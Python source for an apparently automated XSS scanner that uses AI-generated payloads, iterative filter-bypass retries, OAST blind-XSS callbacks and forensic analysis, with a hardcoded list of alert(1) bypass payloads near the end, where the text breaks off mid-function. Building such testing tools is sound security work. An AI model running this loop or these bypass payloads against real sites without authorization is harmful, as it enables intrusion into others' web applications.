"""
Main XSS Testing Orchestrator

This module coordinates all XSS testing activities including:
- Nuclei reconnaissance for reflected XSS
- Form discovery for stored XSS
- Dynamic payload generation and testing
- OAST-based blind XSS detection
- Result compilation and reporting
"""
import json
import logging
import os
from dataclasses import asdict
from datetime import datetime
from typing import Dict, Any, List, Optional

from .agents.recon import ReconAgent
from .agents.form_discovery import FormDiscoveryAgent
from .agents.stored_xss import StoredXSSAgent
from .agents.verifier import DynamicVerifierAgent
from .analyzers.payload_generator import DynamicPayloadAgent
from .models import NucleiResult, VulnerabilityContext, PayloadAttempt, VerificationResult

# Try to import forensic parser (optional functionality)
try:
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent.parent))
    from scripts.parse_artifacts import ArtifactParser
    FORENSICS_AVAILABLE = True
except ImportError:
    FORENSICS_AVAILABLE = False
    ArtifactParser = None


class DynamicXSSOrchestrator:
    """
    Main orchestrator for XSS vulnerability detection and exploitation.

    Coordinates multiple testing approaches:
    1. Reflected XSS via Nuclei + dynamic payloads
    2. Stored XSS via form discovery + submission testing
    3. Blind XSS via OAST techniques (optional)
    """

    def __init__(self, use_proxy: bool = False, proxy_port: int = 8080, config: Dict[str, Any] = None):
        """Initialize the orchestrator with configuration"""
        # Initialize logger first
        self.logger = logging.getLogger(self.__class__.__name__)

        # Load configuration
        self.config = config or {}

        # Initialize agents
        self.recon_agent = ReconAgent()
        self.payload_agent = DynamicPayloadAgent()
        self.verifier_agent = DynamicVerifierAgent()
        self.form_discovery_agent = FormDiscoveryAgent()
        self.stored_xss_agent = StoredXSSAgent()

        # Initialize forensic artifact parser
        self.forensic_parser = None
        self.enable_forensics = self.config.get('enable_forensics', True) and FORENSICS_AVAILABLE
        if self.enable_forensics:
            try:
                self.forensic_parser = ArtifactParser()
                self.logger.info("Forensic artifact parser initialized")
            except Exception as e:
                self.logger.warning(f"Failed to initialize forensic parser: {e}")
                self.enable_forensics = False
        elif not FORENSICS_AVAILABLE:
            self.logger.debug("Forensic parser not available - forensic analysis disabled")

        # OAST configuration
        self.oast_agent = None
        self.use_proxy = use_proxy
        self.proxy_agent = None

        # Try to initialize OAST if available
        try:
            from oast_agent import OASTAgent
            oast_config = self.config.get('oast', {
                'mode': 'auto',
                'threshold': 0.6,
                'backend': 'LocalOASTServer',
                'whitelist': ['127.0.0.1', 'localhost', '*.test', '*.local']
            })
            self.oast_agent = OASTAgent(config=oast_config)
            self.logger.info("OAST agent initialized: mode=%s", self.oast_agent.mode)
        except ImportError:
            self.logger.warning("OAST agent not available - continuing without OAST testing")
        except Exception as e:
            self.logger.warning(f"Failed to initialize OAST agent: {e}")
            self.oast_agent = None

        # Try to initialize proxy if requested
        if use_proxy:
            try:
                from .agents.proxy import ProxyAgent
                self.proxy_agent = ProxyAgent(bind_port=proxy_port)

                # Check if mitmproxy is available before proceeding
                if not self.proxy_agent.is_available():
                    self.logger.warning("mitmproxy (mitmdump) not available - proxy functionality disabled")
                    self.logger.info("Install mitmproxy with: pip install mitmproxy")
                    self.use_proxy = False
                    self.proxy_agent = None
                else:
                    self.logger.info(f"Proxy agent initialized on port {proxy_port}")
                    # Start proxy immediately during initialization to ensure it's ready
                    self.proxy_agent.start()
                    self.logger.info("Proxy started and ready for traffic capture")
            except ImportError as e:
                self.logger.warning(f"Failed to initialize proxy agent: {e}")
                self.logger.info("Continuing without proxy - full functionality maintained")
                self.use_proxy = False
            except Exception as e:
                self.logger.warning(f"Error initializing proxy agent: {e}")
                self.logger.info("Continuing without proxy - full functionality maintained")
                self.use_proxy = False

    async def verify_xss(self, target_url: str) -> List[Dict[str, Any]]:
        """
        Main verification workflow for comprehensive XSS detection.

        Args:
            target_url: Target URL to test for XSS vulnerabilities

        Returns:
            List of vulnerability results with exploitation details
        """
        self.logger.info(f"Starting dynamic XSS verification for {target_url}")

        all_results = []

        # Step 1: Reconnaissance with Nuclei (for reflected XSS)
        nuclei_results = await self.recon_agent.run(target_url)

        # Step 2: Form discovery for stored XSS
        self.logger.info("Discovering forms for stored XSS testing")
        form_candidates = await self.form_discovery_agent.discover_forms(target_url)

        # Step 3: Process reflected XSS vulnerabilities (Nuclei findings)
        if nuclei_results:
            self.logger.info(f"Processing {len(nuclei_results)} reflected XSS vulnerabilities from Nuclei")
            reflected_results = await self._process_reflected_xss(nuclei_results)
            all_results.extend(reflected_results)

        # Step 4: Process stored XSS vulnerabilities (form testing)
        if form_candidates:
            self.logger.info(f"Testing {len(form_candidates)} forms for stored XSS")
            stored_results = await self._process_stored_xss(form_candidates)
            all_results.extend(stored_results)

        # Step 5: Fallback to OAST testing if no vulnerabilities found
        if not all_results:
            self.logger.warning("No XSS vulnerabilities found by Nuclei or form testing")
            if self.oast_agent and self.oast_agent.mode != 'never':
                self.logger.info("No confirmed exploits found, checking for persistence candidates")
                oast_results = await self._attempt_oast_testing(target_url)
                all_results.extend(oast_results)

        # Step 6: Perform forensic analysis if enabled
        forensic_results = None
        if self.enable_forensics and self.forensic_parser:
            try:
                self.logger.info("Starting forensic analysis of testing artifacts")
                forensic_results = await self._perform_forensic_analysis(target_url, all_results)
                if forensic_results:
                    self.logger.info(f"Forensic analysis completed: {len(forensic_results)} findings generated")
                    # Enhance results with forensic insights
                    all_results = self._integrate_forensic_findings(all_results, forensic_results)
            except Exception as e:
                self.logger.error(f"Forensic analysis failed: {e}")

        # Step 7: Save results (including forensic findings)
        self._save_results(all_results, forensic_results)

        # Clean up proxy if used
        if self.proxy_agent and self.proxy_agent.running:
            self.proxy_agent.stop()
            self.logger.info("Proxy agent stopped")

        return all_results

    async def _process_reflected_xss(self, nuclei_results: List[NucleiResult]) -> List[Dict[str, Any]]:
        """Process reflected XSS vulnerabilities found by Nuclei"""
        results = []

        for finding in nuclei_results:
            self.logger.info(f"Processing reflected XSS: {finding.template_name}")

            # Create vulnerability context
            vulnerability_context = VulnerabilityContext(
                nuclei_result=finding,
                attempt_history=[],
                current_attempt=0,
                max_attempts=5
            )

            # Dynamic testing loop
            while vulnerability_context.current_attempt < vulnerability_context.max_attempts:
                try:
                    if vulnerability_context.current_attempt == 0:
                        # Generate initial payload
                        attempt = await self.payload_agent.generate_initial_payload(vulnerability_context)
                    else:
                        # Improve payload based on last result and forensic insights
                        last_playwright_result = vulnerability_context.attempt_history[-1].playwright_response

                        # Check if we have forensic insights to guide payload improvement
                        forensic_context = None
                        if hasattr(vulnerability_context, 'forensic_insights') and vulnerability_context.forensic_insights:
                            latest_forensic = vulnerability_context.forensic_insights[-1]
                            forensic_context = {
                                'fate': latest_forensic.get('fate'),
                                'transformation_type': latest_forensic.get('transformation_type'),
                                'encoding_method': latest_forensic.get('encoding_method'),
                                'bypass_suggestions': latest_forensic.get('suggestions', [])
                            }

                        # Use forensic-enhanced payload improvement
                        attempt = await self._improve_payload_with_forensics(
                            vulnerability_context, last_playwright_result, forensic_context
                        )

                    vulnerability_context.current_attempt = attempt.attempt

                    # Test payload with Playwright
                    active_proxy = self.proxy_agent if self.use_proxy and self.proxy_agent and self.proxy_agent.running else None
                    playwright_result = await self.verifier_agent.run(
                        finding.matched_url,
                        attempt.payload,
                        proxy_agent=active_proxy
                    )

                    # Update attempt with result
                    attempt.result = "success" if playwright_result.executed else "failure"
                    attempt.playwright_response = playwright_result

                    # Add to history
                    vulnerability_context.attempt_history.append(attempt)

                    if playwright_result.executed:
                        # Success!
                        vulnerability_context.successful_payload = attempt.payload
                        self.logger.info(f"SUCCESS: Reflected XSS confirmed in {attempt.attempt} attempts")
                        break
                    else:
                        self.logger.info(f"Attempt {attempt.attempt} failed, analyzing with forensics...")

                        # Perform quick forensic analysis on this attempt if enabled
                        if self.enable_forensics and self.forensic_parser and vulnerability_context.current_attempt > 0:
                            forensic_feedback = await self._analyze_attempt_forensics(
                                attempt, playwright_result, finding.matched_url
                            )

                            if forensic_feedback:
                                # Store forensic feedback in vulnerability context for next iteration
                                if not hasattr(vulnerability_context, 'forensic_insights'):
                                    vulnerability_context.forensic_insights = []
                                vulnerability_context.forensic_insights.append(forensic_feedback)
                                self.logger.info(f"Forensic analysis: {forensic_feedback.get('fate', 'unknown')} - {len(forensic_feedback.get('suggestions', []))} bypass suggestions available")

                except Exception as e:
                    self.logger.error(f"Error in attempt {vulnerability_context.current_attempt + 1}: {e}")
                    # Create failed attempt record
                    failed_attempt = PayloadAttempt(
                        attempt=vulnerability_context.current_attempt + 1,
                        payload="",
                        reasoning=f"Failed to generate payload: {e}",
                        result="error",
                        timestamp=datetime.now().isoformat()
                    )

                    # Create a dummy VerificationResult
                    dummy_result = VerificationResult(
                        url=finding.matched_url,
                        payload="",
                        executed=False,
                        reflection_found=False,
                        error=str(e),
                        timestamp=datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    failed_attempt.playwright_response = dummy_result

                    vulnerability_context.attempt_history.append(failed_attempt)
                    vulnerability_context.current_attempt += 1

            # Compile results for this vulnerability
            vulnerability_result = {
                "type": "reflected_xss",
                "vulnerability": asdict(finding),
                "successful": vulnerability_context.successful_payload is not None,
                "successful_payload": vulnerability_context.successful_payload,
                "total_attempts": len(vulnerability_context.attempt_history),
                "attempt_history": [asdict(attempt) for attempt in vulnerability_context.attempt_history],
                "final_status": "success" if vulnerability_context.successful_payload else "failed_after_max_attempts"
            }

            # Add live forensic insights if available
            if hasattr(vulnerability_context, 'forensic_insights') and vulnerability_context.forensic_insights:
                vulnerability_result["live_forensic_insights"] = {
                    "total_analyses": len(vulnerability_context.forensic_insights),
                    "detected_fates": [insight.get('fate') for insight in vulnerability_context.forensic_insights],
                    "confidence_scores": [insight.get('confidence', 0) for insight in vulnerability_context.forensic_insights],
                    "bypass_techniques_applied": [
                        len(insight.get('suggestions', [])) for insight in vulnerability_context.forensic_insights
                    ],
                    "transformation_types": [insight.get('transformation_type') for insight in vulnerability_context.forensic_insights],
                    "latest_analysis": vulnerability_context.forensic_insights[-1] if vulnerability_context.forensic_insights else None
                }

            results.append(vulnerability_result)

        return results

    async def _process_stored_xss(self, form_candidates) -> List[Dict[str, Any]]:
        """Process stored XSS vulnerabilities via AI-powered dynamic testing"""
        results = []

        for form in form_candidates:
            self.logger.info(f"Testing stored XSS on form {form.form_id} with AI-powered dynamic payloads")

            # Create a dynamic context for stored XSS similar to reflected XSS
            stored_context = await self._create_stored_xss_context(form)

            form_result = {
                "type": "stored_xss",
                "form": asdict(form),
                "successful": False,
                "successful_payload": None,
                "total_attempts": 0,
                "attempts": [],
                "final_status": "failed"
            }

            # Dynamic AI-powered testing loop (similar to reflected XSS)
            while stored_context.current_attempt < stored_context.max_attempts:
                try:
                    if stored_context.current_attempt == 0:
                        # Generate initial AI payload for stored XSS
                        attempt = await self.payload_agent.generate_initial_stored_payload(stored_context)
                    else:
                        # Improve payload based on last result with forensic insights
                        last_attempt_result = stored_context.attempt_history[-1]

                        # Perform quick forensic analysis on this attempt if enabled
                        forensic_context = None
                        if self.enable_forensics and self.forensic_parser and stored_context.current_attempt > 0:
                            forensic_feedback = await self._analyze_stored_attempt_forensics(
                                last_attempt_result, form.action_url
                            )
                            if forensic_feedback:
                                if not hasattr(stored_context, 'forensic_insights'):
                                    stored_context.forensic_insights = []
                                stored_context.forensic_insights.append(forensic_feedback)
                                forensic_context = {
                                    'fate': forensic_feedback.get('fate'),
                                    'transformation_type': forensic_feedback.get('transformation_type'),
                                    'encoding_method': forensic_feedback.get('encoding_method'),
                                    'bypass_suggestions': forensic_feedback.get('suggestions', [])
                                }

                        # Use forensic-enhanced payload improvement for stored XSS
                        attempt = await self._improve_stored_payload_with_forensics(
                            stored_context, last_attempt_result, forensic_context
                        )

                    stored_context.current_attempt = attempt.attempt

                    # Test AI-generated payload
                    active_proxy = self.proxy_agent if self.use_proxy and self.proxy_agent and self.proxy_agent.running else None
                    stored_result = await self.stored_xss_agent.test_stored_xss(form, attempt.payload, active_proxy)

                    # Update attempt with result
                    attempt.result = "success" if stored_result.successful else "failure"
                    attempt.stored_xss_response = stored_result

                    # Add to history
                    stored_context.attempt_history.append(attempt)

                    form_result["attempts"].append({
                        "attempt": attempt.attempt,
                        "payload": attempt.payload,
                        "reasoning": attempt.reasoning,
                        "injection_field": stored_result.injection_field,
                        "submission_success": stored_result.submission_result.get('success', False) if stored_result.submission_result else False,
                        "verification_executed": stored_result.verification_result.executed if stored_result.verification_result else False,
                        "successful": stored_result.successful,
                        "timestamp": attempt.timestamp,
                        "submission_error": stored_result.submission_result.get('error') if stored_result.submission_result and not stored_result.submission_result.get('success') else None
                    })

                    form_result["total_attempts"] += 1

                    if stored_result.successful:
                        # Success with AI-generated payload!
                        form_result["successful"] = True
                        form_result["successful_payload"] = attempt.payload
                        form_result["final_status"] = "success"
                        stored_context.successful_payload = attempt.payload
                        self.logger.info(f"SUCCESS: AI-generated stored XSS confirmed in form {form.form_id} in {attempt.attempt} attempts")
                        break
                    else:
                        self.logger.info(f"AI attempt {attempt.attempt} failed, analyzing and improving...")

                        # Perform forensic analysis for immediate feedback
                        if self.enable_forensics and self.forensic_parser:
                            forensic_feedback = await self._analyze_stored_attempt_forensics(
                                attempt, form.action_url
                            )
                            if forensic_feedback:
                                if not hasattr(stored_context, 'forensic_insights'):
                                    stored_context.forensic_insights = []
                                stored_context.forensic_insights.append(forensic_feedback)
                                self.logger.info(f"Forensic analysis: {forensic_feedback.get('fate', 'unknown')} - {len(forensic_feedback.get('suggestions', []))} bypass suggestions available")

                except Exception as e:
                    self.logger.error(f"Error in AI attempt {stored_context.current_attempt + 1}: {e}")
                    # Create failed attempt record
                    failed_attempt = PayloadAttempt(
                        attempt=stored_context.current_attempt + 1,
                        payload="",
                        reasoning=f"Failed to generate AI payload: {e}",
                        result="error",
                        timestamp=datetime.now().isoformat()
                    )
                    stored_context.attempt_history.append(failed_attempt)
                    stored_context.current_attempt += 1

            # Add AI forensic insights if available
            if hasattr(stored_context, 'forensic_insights') and stored_context.forensic_insights:
                form_result["ai_forensic_insights"] = {
                    "total_analyses": len(stored_context.forensic_insights),
                    "detected_fates": [insight.get('fate') for insight in stored_context.forensic_insights],
                    "confidence_scores": [insight.get('confidence', 0) for insight in stored_context.forensic_insights],
                    "bypass_techniques_applied": [
                        len(insight.get('suggestions', [])) for insight in stored_context.forensic_insights
                    ],
                    "transformation_types": [insight.get('transformation_type') for insight in stored_context.forensic_insights],
                    "latest_analysis": stored_context.forensic_insights[-1] if stored_context.forensic_insights else None
                }

            results.append(form_result)

        return results

    async def _attempt_oast_testing(self, target_url: str) -> List[Dict[str, Any]]:
        """Attempt OAST testing based on persistence candidates"""
        if not self.oast_agent:
            return []

        try:
            # Get persistence candidates from ReconAgent
            candidates = await self.recon_agent.get_persistence_candidates(target_url)

            if not candidates:
                self.logger.info("No persistence candidates found for OAST testing")
                return []

            results = []
            for candidate in candidates:
                # Score the candidate using the persistence scorer
                try:
                    from persistence import PersistenceScorer
                    scorer = PersistenceScorer()
                    score = scorer.compute_persistence_score(candidate)
                except ImportError:
                    score = 0.5  # Default score if scorer unavailable

                if score >= self.oast_agent.threshold:
                    self.logger.info(f"Candidate {candidate.id} scored {score:.2f} (above threshold {self.oast_agent.threshold})")
                    oast_result = await self._execute_oast_attempt(candidate, score, target_url)
                    if oast_result:
                        results.append(oast_result)
                else:
                    self.logger.debug(f"Candidate {candidate.id} scored {score:.2f} (below threshold {self.oast_agent.threshold})")

            return results

        except Exception as e:
            self.logger.error(f"OAST testing failed: {e}")
            return []

    async def _execute_oast_attempt(self, candidate, score: float, target_url: str) -> Optional[Dict[str, Any]]:
        """Execute a single OAST attempt"""
        try:
            # Register OAST token with metadata
            metadata = {
                'candidate_id': candidate.id,
                'target_url': target_url,
                'candidate_url': candidate.url,
                'method': candidate.method,
                'score': score,
                'timestamp': datetime.now().isoformat()
            }
            callback_identifier = await self.oast_agent.register_token(metadata)
            self.logger.info(f"Registered OAST token: {callback_identifier}")

            # Generate OAST payload with candidate context
            candidate_context = {
                'location': 'unknown',  # Would need more sophisticated detection
                'method': candidate.method,
                'params': candidate.params
            }
            payload = self.oast_agent.generate_payload_for_context(candidate_context, callback_identifier)
            self.logger.info(f"Generated OAST payload for {candidate.id}: {payload[:50]}...")

            # Test with verifier (use candidate URL not target URL)
            verification_result = await self.verifier_agent.run(candidate.url, payload)

            # Poll for callbacks
            poll_timeout = self.oast_agent.poll_timeout
            self.logger.info(f"Polling for callbacks (timeout: {poll_timeout}s)")
            callbacks = await self.oast_agent.poll_for_callbacks(callback_identifier, timeout=poll_timeout)

            successful = len(callbacks) > 0
            if successful:
                self.logger.info(f"OAST: Received {len(callbacks)} callbacks for {candidate.id}")
            else:
                self.logger.info(f"OAST: No callbacks received for {candidate.id}")

            # Compile result
            return {
                'type': 'oast_attempt',
                'candidate': asdict(candidate),
                'score': score,
                'callback_identifier': callback_identifier,
                'payload': payload,
                'callbacks': [asdict(cb) for cb in callbacks],
                'successful': successful,
                'total_attempts': 1,
                'timestamp': datetime.now().isoformat(),
                'verification_result': asdict(verification_result) if verification_result else None
            }

        except Exception as e:
            self.logger.error(f"OAST execution failed for {candidate.id}: {e}")
            return {
                'type': 'oast_attempt',
                'candidate': asdict(candidate),
                'error': str(e),
                'successful': False,
                'total_attempts': 1,
                'timestamp': datetime.now().isoformat()
            }

    def _save_results(self, results: List[Dict[str, Any]], forensic_results: List = None):
        """Save results to JSON files with optional forensic findings"""
        # Calculate summary statistics
        successful_exploits = sum(1 for r in results if r.get('successful', False))
        total_attempts = sum(r.get('total_attempts', 1) for r in results)

        # Create comprehensive results object
        results_data = {
            "scan_date": datetime.now().isoformat(),
            "target_processed": len(results),
            "successful_exploits": successful_exploits,
            "success_rate": f"{(successful_exploits/len(results)*100):.1f}%" if results else "0%",
            "total_attempts_made": total_attempts,
            "average_attempts_per_vulnerability": f"{(total_attempts/len(results)):.1f}" if results else "0",
            "vulnerabilities": results
        }

        # Save to multiple locations
        os.makedirs("./results", exist_ok=True)

        output_files = [
            "./dynamic_xss_results.json",
            "./results/dynamic_xss_results.json"
        ]

        for output_file in output_files:
            try:
                with open(output_file, 'w') as f:
                    json.dump(results_data, f, indent=2, default=str)
                self.logger.info(f"Results saved to {output_file}")
            except Exception as e:
                self.logger.error(f"Failed to save results to {output_file}: {e}")

        # Add forensic results if available
        if forensic_results:
            results_data["forensic_analysis"] = {
                "enabled": True,
                "findings_count": len(forensic_results),
                "findings": [asdict(f) for f in forensic_results] if hasattr(forensic_results[0], '__dict__') else forensic_results
            }

            # Save forensic-specific outputs
            try:
                forensic_dir = "./results/forensics"
                os.makedirs(forensic_dir, exist_ok=True)

                # Create session-specific directory
                session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
                session_forensic_dir = f"{forensic_dir}/{session_id}"
                os.makedirs(session_forensic_dir, exist_ok=True)

                # Save forensic findings
                if hasattr(self.forensic_parser, 'save_findings'):
                    self.forensic_parser.save_findings(forensic_results, session_forensic_dir)
                    self.logger.info(f"Forensic analysis saved to {session_forensic_dir}")
            except Exception as e:
                self.logger.error(f"Failed to save forensic analysis: {e}")
        else:
            results_data["forensic_analysis"] = {"enabled": self.enable_forensics, "findings_count": 0}

        self.logger.info(f"Results saved to ./dynamic_xss_results.json and ./results/dynamic_xss_results.json")

    async def _perform_forensic_analysis(self, target_url: str, test_results: List[Dict[str, Any]]) -> List:
        """Perform forensic analysis of testing artifacts"""
        if not self.forensic_parser:
            return None

        try:
            # Collect HAR files from proxy captures
            har_paths = []
            proxy_captures_dir = Path("./proxy_captures")
            if proxy_captures_dir.exists():
                # Get recent HAR files (last 5 captures)
                har_files = sorted(proxy_captures_dir.glob("*.har"),
                                 key=lambda x: x.stat().st_mtime, reverse=True)[:5]
                har_paths = [str(p) for p in har_files]
                self.logger.info(f"Found {len(har_paths)} HAR files for forensic analysis")

            # Collect HTML captures if available
            html_paths = []
            screenshots_dir = Path("./screenshots")
            if screenshots_dir.exists():
                html_files = list(screenshots_dir.glob("*.html")) + list(screenshots_dir.glob("*.htm"))
                html_paths = [str(p) for p in html_files[-10:]]  # Last 10 HTML captures

            # Create synthetic attempt data from test results
            findings = []
            attempt_id = 1

            for result in test_results:
                if result.get('type') == 'stored_xss':
                    # Process stored XSS attempts
                    for attempt in result.get('attempts', []):
                        try:
                            # Create temporary attempt metadata
                            attempt_data = {
                                'attempt_id': f"forensic_{attempt_id:03d}",
                                'vulnerability_id': result.get('form', {}).get('form_id', 'unknown'),
                                'cid': datetime.now().strftime("%Y%m%d_%H%M%S"),
                                'url': target_url,
                                'method': 'POST',
                                'payload': attempt.get('payload', ''),
                                'submitted_payload': attempt.get('payload', ''),
                                'timestamp': attempt.get('timestamp', datetime.now().isoformat())
                            }

                            # Analyze using forensic parser
                            finding = self.forensic_parser.analyze_attempt_data(
                                attempt_data, har_paths, html_paths
                            )
                            findings.append(finding)
                            attempt_id += 1

                        except Exception as e:
                            self.logger.warning(f"Failed to analyze attempt {attempt_id}: {e}")
                            continue

            return findings

        except Exception as e:
            self.logger.error(f"Forensic analysis error: {e}")
            return None

    def _integrate_forensic_findings(self, test_results: List[Dict[str, Any]],
                                   forensic_findings: List) -> List[Dict[str, Any]]:
        """Integrate forensic findings with test results to enhance insights"""
        if not forensic_findings:
            return test_results

        try:
            # Create enhanced results with forensic insights
            enhanced_results = []

            for result in test_results:
                enhanced_result = result.copy()

                # Find matching forensic findings for this result
                matching_findings = []
                result_payloads = self._extract_payloads_from_result(result)

                for finding in forensic_findings:
                    if hasattr(finding, 'submitted_payload'):
                        if finding.submitted_payload in result_payloads:
                            matching_findings.append(finding)
                    elif isinstance(finding, dict):
                        if finding.get('submitted_payload', '') in result_payloads:
                            matching_findings.append(finding)

                if matching_findings:
                    # Add forensic analysis section
                    enhanced_result['forensic_analysis'] = {
                        'findings_count': len(matching_findings),
                        'confidence_scores': [f.confidence_score if hasattr(f, 'confidence_score')
                                            else f.get('confidence_score', 0) for f in matching_findings],
                        'recommendations': [f.recommendation if hasattr(f, 'recommendation')
                                         else f.get('recommendation', '') for f in matching_findings],
                        'payload_fates': [f.difference_summary if hasattr(f, 'difference_summary')
                                        else f.get('difference_summary', 'unknown') for f in matching_findings]
                    }

                    # Enhance recommendations based on forensic insights
                    forensic_recommendations = self._generate_enhanced_recommendations(matching_findings)
                    if forensic_recommendations:
                        enhanced_result['enhanced_recommendations'] = forensic_recommendations

                enhanced_results.append(enhanced_result)

            return enhanced_results

        except Exception as e:
            self.logger.error(f"Failed to integrate forensic findings: {e}")
            return test_results

    def _extract_payloads_from_result(self, result: Dict[str, Any]) -> List[str]:
        """Extract all payloads from a test result"""
        payloads = set()

        if result.get('type') == 'stored_xss':
            for attempt in result.get('attempts', []):
                if attempt.get('payload'):
                    payloads.add(attempt['payload'])
        elif result.get('type') == 'reflected_xss':
            for attempt in result.get('attempt_history', []):
                if attempt.get('payload'):
                    payloads.add(attempt['payload'])
            if result.get('successful_payload'):
                payloads.add(result['successful_payload'])

        return list(payloads)

    def _generate_enhanced_recommendations(self, findings: List) -> Dict[str, Any]:
        """Generate enhanced recommendations based on forensic analysis"""
        try:
            if not findings:
                return None

            # Analyze findings to generate intelligent recommendations
            fates = []
            confidences = []
            ai_suggestions = []

            for finding in findings:
                if hasattr(finding, 'difference_summary'):
                    fates.append(finding.difference_summary)
                    confidences.append(finding.confidence_score)
                    if hasattr(finding, 'ai_analysis') and finding.ai_analysis.get('bypass_suggestions'):
                        ai_suggestions.extend(finding.ai_analysis['bypass_suggestions'])
                elif isinstance(finding, dict):
                    fates.append(finding.get('difference_summary', 'unknown'))
                    confidences.append(finding.get('confidence_score', 0))
                    if finding.get('ai_analysis', {}).get('bypass_suggestions'):
                        ai_suggestions.extend(finding['ai_analysis']['bypass_suggestions'])

            # Generate strategic recommendations
            recommendations = {
                'overall_confidence': sum(confidences) / len(confidences) if confidences else 0,
                'dominant_fate': max(set(fates), key=fates.count) if fates else 'unknown',
                'next_actions': [],
                'ai_bypass_techniques': list(set(ai_suggestions))[:5]  # Top 5 unique suggestions
            }

            # Strategic next actions based on forensic analysis
            dominant_fate = recommendations['dominant_fate']
            if dominant_fate == 'stored_escaped':
                recommendations['next_actions'] = [
                    'Try HTML entity breaking payloads',
                    'Test attribute-based XSS vectors',
                    'Attempt mixed-case variations',
                    'Use polyglot payloads for multiple contexts'
                ]
            elif dominant_fate == 'stored_encoded':
                recommendations['next_actions'] = [
                    'Test double URL encoding techniques',
                    'Try Unicode normalization bypasses',
                    'Use mixed encoding combinations',
                    'Attempt hex/decimal entity encoding'
                ]
            elif dominant_fate == 'stored_modified':
                recommendations['next_actions'] = [
                    'Analyze specific filtering patterns',
                    'Try context-specific bypass techniques',
                    'Test alternative tag structures',
                    'Use CSS/SVG-based vectors'
                ]
            elif dominant_fate == 'not_stored':
                recommendations['next_actions'] = [
                    'Verify correct injection endpoints',
                    'Check authentication requirements',
                    'Test alternative injection parameters',
                    'Try timing-based injection'
                ]
            elif dominant_fate == 'stored_raw':
                recommendations['next_actions'] = [
                    'SUCCESS: Confirmed vulnerability',
                    'Test additional payload variants',
                    'Verify consistent behavior',
                    'Document exploitation steps'
                ]

            return recommendations

        except Exception as e:
            self.logger.error(f"Failed to generate enhanced recommendations: {e}")
            return None

    async def _analyze_attempt_forensics(self, attempt, playwright_result, target_url):
        """Perform quick forensic analysis on a single attempt for immediate feedback"""
        if not self.forensic_parser:
            return None

        try:
            # Create temporary attempt metadata for forensic analysis
            attempt_data = {
                'attempt_id': f"live_{attempt.attempt:03d}",
                'vulnerability_id': 'live_analysis',
                'cid': datetime.now().strftime("%Y%m%d_%H%M%S"),
                'url': target_url,
                'method': 'GET',  # Assume GET for reflected XSS
                'payload': attempt.payload,
                'submitted_payload': attempt.payload,
                'timestamp': attempt.timestamp
            }

            # Look for recent HAR files from proxy captures
            har_paths = []
            proxy_captures_dir = Path("./proxy_captures")
            if proxy_captures_dir.exists():
                recent_har_files = sorted(proxy_captures_dir.glob("*.har"),
                                        key=lambda x: x.stat().st_mtime, reverse=True)[:2]
                har_paths = [str(p) for p in recent_har_files]

            # Check for playwright HTML captures
            html_paths = []
            if hasattr(playwright_result, 'page_content') and playwright_result.page_content:
                # Save temporary HTML capture for analysis
                temp_html = Path("./temp_forensic_analysis.html")
                with open(temp_html, 'w', encoding='utf-8') as f:
                    f.write(playwright_result.page_content)
                html_paths = [str(temp_html)]

            # Perform quick forensic analysis
            if har_paths or html_paths:
                finding = self.forensic_parser.analyze_attempt_data(
                    attempt_data, har_paths, html_paths
                )

                if finding and hasattr(finding, 'difference_summary'):
                    return {
                        'fate': finding.difference_summary,
                        'confidence': finding.confidence_score,
                        'suggestions': finding.ai_analysis.get('bypass_suggestions', []) if finding.ai_analysis else [],
                        'transformation_type': finding.ai_analysis.get('transformation_type') if finding.ai_analysis else None,
                        'encoding_method': finding.ai_analysis.get('encoding_method') if finding.ai_analysis else None
                    }

            return None

        except Exception as e:
            self.logger.warning(f"Quick forensic analysis failed: {e}")
            return None

        finally:
            # Clean up temporary files
            temp_html = Path("./temp_forensic_analysis.html")
            if temp_html.exists():
                temp_html.unlink()

    async def _improve_payload_with_forensics(self, vulnerability_context, last_playwright_result, forensic_context):
        """Improve payload using both traditional methods and forensic intelligence"""
        try:
            # Start with traditional payload improvement
            base_attempt = await self.payload_agent.improve_payload(vulnerability_context, last_playwright_result)

            # Enhance with forensic insights if available
            if forensic_context and forensic_context.get('fate'):
                fate = forensic_context['fate']
                suggestions = forensic_context.get('bypass_suggestions', [])

                # Apply forensic-based improvements based on payload fate
                if fate == 'stored_escaped' and suggestions:
                    # HTML entity encoding detected - try breaking techniques
                    enhanced_payload = self._apply_html_entity_bypasses(base_attempt.payload, suggestions)
                    if enhanced_payload != base_attempt.payload:
                        base_attempt.payload = enhanced_payload
                        base_attempt.reasoning += f" + Forensic insight: HTML entities detected, applied breaking techniques"

                elif fate == 'stored_encoded' and suggestions:
                    # URL encoding detected - try double encoding or alternative methods
                    enhanced_payload = self._apply_encoding_bypasses(base_attempt.payload, suggestions)
                    if enhanced_payload != base_attempt.payload:
                        base_attempt.payload = enhanced_payload
                        base_attempt.reasoning += f" + Forensic insight: URL encoding detected, trying bypass methods"

                elif fate == 'stored_modified' and suggestions:
                    # Partial filtering detected - try context-specific bypasses
                    enhanced_payload = self._apply_filter_bypasses(base_attempt.payload, suggestions)
                    if enhanced_payload != base_attempt.payload:
                        base_attempt.payload = enhanced_payload
                        base_attempt.reasoning += f" + Forensic insight: Filtering detected, applying context-breaking techniques"

                elif fate == 'not_stored' and suggestions:
                    # Payload not stored - try parameter variations
                    enhanced_payload = self._apply_parameter_bypasses(base_attempt.payload, suggestions)
                    if enhanced_payload != base_attempt.payload:
                        base_attempt.payload = enhanced_payload
                        base_attempt.reasoning += f" + Forensic insight: Payload not stored, trying parameter variations"

            return base_attempt

        except Exception as e:
            self.logger.error(f"Forensic-enhanced payload improvement failed: {e}")
            # Fallback to traditional improvement
            return await self.payload_agent.improve_payload(vulnerability_context, last_playwright_result)

    def _apply_html_entity_bypasses(self, payload, suggestions):
        """Apply HTML entity bypass techniques based on forensic suggestions"""
        bypasses = [
            # Attribute-based XSS to break out of HTML entity context
            f'"><img src=x onerror=alert(1)>',
            f'"><svg onload=alert(1)>',
            # Mixed case to bypass simple filters
            f'<ScRiPt>alert(1)</ScRiPt>',
            # Event handler variations
            f'<img src=x onerror="alert(1)">',
            # JavaScript URL schemes
            f'<iframe src="javascript:alert(1)">',
            # CSS-based vectors
            f'<style>@import"javascript:alert(1)";</style>'
        ]

        # Select bypass based on AI suggestions
        for suggestion in suggestions:
            if 'attribute' in suggestion.lower():
                return bypasses[0]  # Attribute-based
            elif 'mixed' in suggestion.lower() or 'case' in suggestion.lower():
                return bypasses[2]  # Mixed case
